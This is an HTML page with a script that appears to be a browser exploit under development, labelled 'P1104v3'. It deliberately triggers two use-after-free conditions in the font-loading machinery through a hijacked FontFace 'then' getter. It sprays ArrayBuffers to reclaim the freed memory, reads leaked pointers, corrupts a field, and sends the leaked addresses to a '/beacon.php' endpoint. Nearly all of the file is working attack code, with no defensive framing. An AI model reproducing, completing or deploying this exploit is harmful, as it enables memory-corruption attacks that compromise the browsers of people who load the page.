<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1104v3</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:12px/1.5 monospace;padding:12px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body>
<div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex(v){return'0x'+v.toString(16);}

B('P1104v3-BOOT','');
log('phase','P1104v3: DUAL UAF diagnostic — find crash point');

var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
var K=8;

// ============================================================
// UAF #1: Exact proven pattern
// ============================================================
var st1=document.createElement('style');
st1.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st1);
var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(f0);void f0.loaded;

var fired1=false,map1=null,buf1=null,ptrs1=null,idx1=-1,patched1=false;
Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(fired1)return undefined;fired1=true;
  if(st1){st1.remove();st1=null;}
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;
  map1=[];
  for(var si=0;si<SIZES.length;si++){
    var sz=SIZES[si];
    for(var k=0;k<K;k++){map1.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
  }
  try{document.fonts.check('1em s0');}catch(e){}
  return undefined;
},set:function(){}});
document.fonts.load('1em f0, s0','AB').then(function(){},function(){});

// Poll UAF1
for(var t=15;t<=200;t+=5){(function(ms){setTimeout(function(){
  if(patched1||!map1)return;
  for(var bi=32;bi<40;bi++){
    if(!map1[bi])continue;
    var b=new BigUint64Array(map1[bi].ab);
    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
    if(nz>0&&!patched1){
      patched1=true;buf1=b;idx1=bi;ptrs1=[];
      for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs1.push({off:q*8,val:b[q]});
      b[0]=0x100n;
      B('P1104v3-UAF1','buf='+bi+'|ms='+ms+'|'+ptrs1.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
    }
  }
},ms);})(t);}

// ============================================================
// UAF #2: Step-by-step diagnostic with beacons at EVERY step
// ============================================================
setTimeout(function(){
  if(!patched1){B('P1104v3-NOHIT1','');return;}
  B('P1104v3-STEP1','uaf1 stable');

  // --- TEST A: Can we call fonts.clear() safely? ---
  var fcount=0;
  try{document.fonts.forEach(function(){fcount++;});}catch(e){}
  B('P1104v3-STEP2','fontsCount='+fcount);

  // Skip clear() — just add new fonts alongside existing ones
  // This avoids touching UAF1's corrupted state
  B('P1104v3-STEP3','skip clear, adding s2');

  var st2=document.createElement('style');
  st2.textContent="@font-face{font-family:s2;src:local(Courier);unicode-range:U+0043;}";
  document.head.appendChild(st2);
  B('P1104v3-STEP4','style added');

  var f2=new FontFace('f2','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(f2);
  B('P1104v3-STEP5','f2 added');

  void f2.loaded;
  B('P1104v3-STEP6','f2.loaded accessed');

  var fired2=false,map2=null,buf2=null,ptrs2=null,idx2=-1,patched2=false;

  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired2)return undefined;fired2=true;
    B('P1104v3-G2-ENTER','');

    // Step-by-step inside getter with try/catch
    try{
      if(st2){st2.remove();st2=null;}
      B('P1104v3-G2-STYLE','removed');
    }catch(e){B('P1104v3-G2-STYLE-ERR',e.message);return undefined;}

    try{
      document.fonts.delete(this);
      B('P1104v3-G2-DELETE','ok');
    }catch(e){B('P1104v3-G2-DELETE-ERR',e.message);}

    try{
      document.body.offsetHeight;
      B('P1104v3-G2-LAYOUT','ok');
    }catch(e){B('P1104v3-G2-LAYOUT-ERR',e.message);}

    // Small spray first — just 192-byte buffers
    try{
      map2=[];
      for(var k=0;k<16;k++){map2.push(new ArrayBuffer(192));}
      B('P1104v3-G2-SPRAY','16x192');
    }catch(e){B('P1104v3-G2-SPRAY-ERR',e.message);return undefined;}

    try{document.fonts.check('1em s2');}catch(e){}
    B('P1104v3-G2-CHECK','done');

    // Inline scan
    var found=-1;
    for(var bi=0;bi<map2.length;bi++){
      var b=new BigUint64Array(map2[bi]);
      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
      if(nz>0){found=bi;buf2=b;idx2=bi;ptrs2=[];
        for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs2.push({off:q*8,val:b[q]});
        b[0]=0x100n;break;
      }
    }
    B('P1104v3-G2-SCAN','found='+found);
    B('P1104v3-G2-EXIT','');
    return undefined;
  },set:function(){}});

  B('P1104v3-STEP7','getter defined, calling fonts.load');

  document.fonts.load('1em f2, s2','CD').then(function(){
    B('P1104v3-LOAD2-OK','resolved');
  },function(e){
    B('P1104v3-LOAD2-ERR',e?e.message:'unknown');
  });
  B('P1104v3-STEP8','fonts.load called');

  // Poll UAF2
  for(var t2=15;t2<=400;t2+=10){(function(ms){setTimeout(function(){
    if(patched2||!map2)return;
    for(var bi=0;bi<map2.length;bi++){
      var b=new BigUint64Array(map2[bi]);
      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
      if(nz>0&&!patched2){
        patched2=true;buf2=b;idx2=bi;ptrs2=[];
        for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs2.push({off:q*8,val:b[q]});
        b[0]=0x100n;
        B('P1104v3-UAF2-POLL','buf='+bi+'|ms='+ms+'|'+ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
      }
    }
  },ms);})(t2);}

  // Results at 2s
  setTimeout(function(){
    B('P1104v3-RESULT','fired2='+fired2+'|patched2='+patched2+'|idx2='+idx2);
    if(ptrs2&&ptrs2.length>0){
      B('P1104v3-PTRS2',ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
    }
    B('P1104v3-DONE','uaf2='+patched2);
  },2500);
},600);
</script>
</body></html>
